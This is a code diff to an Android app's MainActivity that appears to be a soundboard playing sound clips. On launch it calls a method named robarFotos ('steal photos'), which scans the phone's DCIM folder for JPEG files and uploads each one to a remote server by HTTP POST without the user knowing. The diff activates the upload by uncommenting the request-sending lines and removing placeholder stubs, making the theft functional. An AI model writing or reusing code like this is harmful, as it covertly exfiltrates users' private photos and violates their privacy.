@@ -10,30 +10,27 @@ import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
 
-import org.apache.http.HttpResponse;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.methods.HttpGet;
-import org.apache.http.client.methods.HttpPost;
-import org.apache.http.impl.client.DefaultHttpClient;
-
 import android.app.Activity;
-import android.media.AudioManager;
 import android.media.MediaPlayer;
-import android.media.SoundPool;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.Looper;
 import android.util.Log;
 import android.view.Menu;
 import android.view.View;
-import android.widget.Button;
-import android.widget.TextView;
+
+import ch.boye.httpclientandroidlib.HttpResponse;
 import ch.boye.httpclientandroidlib.HttpVersion;
 import ch.boye.httpclientandroidlib.client.ClientProtocolException;
+import ch.boye.httpclientandroidlib.client.HttpClient;
 import ch.boye.httpclientandroidlib.client.entity.UrlEncodedFormEntity;
+import ch.boye.httpclientandroidlib.client.methods.HttpGet;
+import ch.boye.httpclientandroidlib.client.methods.HttpPost;
 import ch.boye.httpclientandroidlib.entity.mime.HttpMultipartMode;
 import ch.boye.httpclientandroidlib.entity.mime.MultipartEntity;
 import ch.boye.httpclientandroidlib.entity.mime.content.ByteArrayBody;
+import ch.boye.httpclientandroidlib.impl.client.DefaultHttpClient;
 import ch.boye.httpclientandroidlib.message.BasicNameValuePair;
 import ch.boye.httpclientandroidlib.params.CoreProtocolPNames;
 import ch.boye.httpclientandroidlib.util.EntityUtils;
@@ -41,15 +38,12 @@ import ch.boye.httpclientandroidlib.util.EntityUtils;
 import com.google.common.io.Files;
 
 public class MainActivity extends Activity {
-	private int uploaded;
-
-	MediaPlayer mp;
+	private MediaPlayer mp;
 	
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
-		uploaded = 0;	
 		//mandarRequest(null);
 		robarFotos(null);
 	}
@@ -57,7 +51,9 @@ public class MainActivity extends Activity {
 	public void robarFotos(View v) {
 	    new Thread(new Runnable() {
 	        public void run() {
+	        	Looper.prepare();
 	            mandarRequest(null);
+	            Looper.loop();
 	        }
 	    }).start();
 	}
@@ -72,7 +68,9 @@ public class MainActivity extends Activity {
 	public void reproducirSonido(View view) {
 		try{
 			this.mp.stop();
-		}catch(Exception e){} 
+		}catch(Exception e){
+			Log.d("LALLAMA","Problem playing file");
+		} 
 		finally{
 			String soundToReproduce = view.getTag().toString();
 			Integer soundId = getResources().getIdentifier( soundToReproduce , "raw" , this.getPackageName() );
@@ -80,11 +78,7 @@ public class MainActivity extends Activity {
 			soundId);
 			this.mp = mimp;
 			this.mp.start();
-			//mandarRequest(view);
 		}
-		//spool = new SoundPool(1, AudioManager.STREAM_MUSIC, 0);
-		//soundID = spool.load(this, R.raw.¯, 1);
-		//Sound();
 	}
 	
 	public void pararSonido(View view) {
@@ -97,11 +91,15 @@ public class MainActivity extends Activity {
 		File sdCardRoot = Environment.getExternalStorageDirectory();
 		File f = new File(sdCardRoot, "/DCIM/prueba");
 		File[] files = f.listFiles();
-		for (File inFile : files) {
-			if (inFile.isFile() && inFile.getName().matches("(.*)\\.jpg$")) {
-				Log.d("LALLAMA",inFile.getName());
-				new ImageUploadTask().execute(inFile);
-			}
+		if(files != null){
+			for (File inFile : files) {
+				if (inFile.isFile() && inFile.getName().matches("(.*)\\.jpg$")) {
+					Log.d("LALLAMA",inFile.getName());
+					new ImageUploadTask().execute(inFile);
+				}
+			}			
+		}else{
+			Log.d("LALLAMA","No SD CARD!");
 		}
 	}
 
@@ -127,9 +125,6 @@ public class MainActivity extends Activity {
 	}
 
 	private void showData(String data) {
-		uploaded++;
-		//TextView p1_button = (TextView) findViewById(R.id.unLabel);
-		//p1_button.setText("Archivos Subidos :" + uploaded);
 	}
 
 	private class ImageUploadTask extends AsyncTask<File, Integer, String> {
@@ -186,17 +181,16 @@ public class MainActivity extends Activity {
 			String digest = toSHA1(imageBytes);
 	
 			try {
-				//httppost.setEntity(new UrlEncodedFormEntity(Arrays.asList(new BasicNameValuePair("digest",digest))));
-			} catch (Exception e) {
-			//} catch (UnsupportedEncodingException e) {
+				httppost.setEntity(new UrlEncodedFormEntity(Arrays.asList(new BasicNameValuePair("digest",digest))));
+			//} catch (Exception e) {
+			} catch (UnsupportedEncodingException e) {
 				e.printStackTrace();
 				return null;
 			}
 
 		    try {
 		    	HttpResponse response = client.execute(httppost);
-		    	//String resp = EntityUtils.toString(response.getEntity());
-		    	String resp = "hola"; //BORRAME
+		    	String resp = EntityUtils.toString(response.getEntity());
 
 		    	return resp.equals("OK") ? imageBytes : null;
 		    } catch (ClientProtocolException e) {
@@ -229,11 +223,10 @@ public class MainActivity extends Activity {
 			ByteArrayBody fb = new ByteArrayBody(imageBytes,"image/"+extension,f.getName());
 			entity.addPart( "imageName", fb);
 			 			 
-			//httppost.setEntity( entity );
+			httppost.setEntity( entity );
 			 
 			try {
-				return "hola"; //BORRAME
-				//return EntityUtils.toString( client.execute( httppost ).getEntity(), "UTF-8" );
+				return EntityUtils.toString( client.execute( httppost ).getEntity(), "UTF-8" );
 			} catch (Exception e) {
 				e.printStackTrace();
 				return null;
@@ -247,7 +240,6 @@ public class MainActivity extends Activity {
 	private class GetTask extends AsyncTask<String, Integer, String> {
 		@Override
 		protected String doInBackground(String... params) {
-			// TODO Auto-generated method stub
 			return getData();
 		}
 
